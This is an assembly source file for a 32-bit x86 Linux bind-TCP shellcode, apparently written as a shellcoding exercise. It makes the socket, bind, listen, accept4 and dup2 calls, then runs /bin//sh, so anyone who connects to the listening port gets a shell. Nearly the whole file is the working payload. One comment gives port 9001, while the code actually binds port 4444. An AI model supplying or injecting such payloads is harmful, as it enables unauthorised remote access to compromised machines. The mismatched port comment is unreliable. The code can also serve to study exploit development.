; Author: Eduardo Silva
; 
; Shell Bind TCP Shellcode
; 
;

global	_start

section	.text

_start:
	
	xor eax, eax
	cdq
	
	; socket syscall
	mov ax, 0x167
	;xor ebx, ebx
	;mov bl, 0x02
	push byte 0x02
	pop ebx
	;xor ecx, ecx
	;mov cl, 0x01
	push byte 0x01
	pop ecx
	; edx is already zero
	int 0x80	; interruption syscall or interrupt vector. Returns pointer to the socket in eax

	; bind syscall

	mov ebx, eax 	; moves socket address to ebx (first arg - sockfd)
	xor eax, eax
	push edx	; edx remains zero
	
	; sockaddr struct	
	;push edx
	push edx	; 0.0.0.0
	push word 0x5C11 ;little endian -> 9001 = 0x2329
	push word 0x2
	mov ecx, esp
	
	mov dl, 0x10
	mov ax, 0x169
	int 0x80
	
	; listen syscall

	xor eax, eax
	xor ecx, ecx
	; ebx already has sockfd
	mov ax, 0x16b
	;add ax, 0x2
	int 0x80

	; accept4 syscall

	; ebx already has sockfd
	xor eax, eax
	cdq
	xor ecx, ecx
	xor esi, esi
	mov ax, 0x16c 	
	int 0x80

	;xor edi, edi
	mov edx, eax ; edx is already zero

	; dup2
	mov cl, 0x03
dup2:
	;xor eax, eax
	;mov al, 0x3f
	push byte 0x3f
	pop eax
	mov ebx, edx
	dec cl
	int 0x80
	jnz dup2	; decrements ecx and jumps until ecx=0

	; execve

	
	cdq	; edx needs to be zero
	;push eax
	push ecx	; ecx is zero because jnz
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	;xor eax, eax
	;mov al, 0xb
	push byte 0xb
	pop eax
	int 0x80		


